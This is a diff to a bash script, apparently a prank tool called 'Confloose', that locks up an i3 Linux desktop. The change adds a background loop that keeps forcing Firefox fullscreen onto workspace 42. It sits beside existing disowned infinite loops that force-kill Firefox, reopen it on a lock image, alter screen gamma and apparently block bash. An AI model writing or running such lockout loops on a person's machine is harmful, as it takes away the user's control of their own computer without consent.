@@ -9,6 +9,9 @@ function showImage {
     killall -9 firefox;
     sleep 0.2;
     firefox --new-window https://raw.githubusercontent.com/MarcVillain/Confloose/master/images/Lock.gif;
+}
+
+function fullScreenFirefox {
     i3-msg '[title=".*Mozilla Firefox"] fullscreen enable; [title=".*Mozilla Firefox"] move workspace 42';
 }
 
@@ -28,5 +31,6 @@ function preventBash {
 while true; do forceWorkspace; done 2>&1>/dev/null &
 while true; do showImage; done 2>&1>/dev/null &
 while true; do updateGamma; done 2>&1>/dev/null &
+while true; do fullScreenFirefox; done 2>&1>/dev/null &
 while true; do preventBash; done 2>&1>/dev/null &
 disown
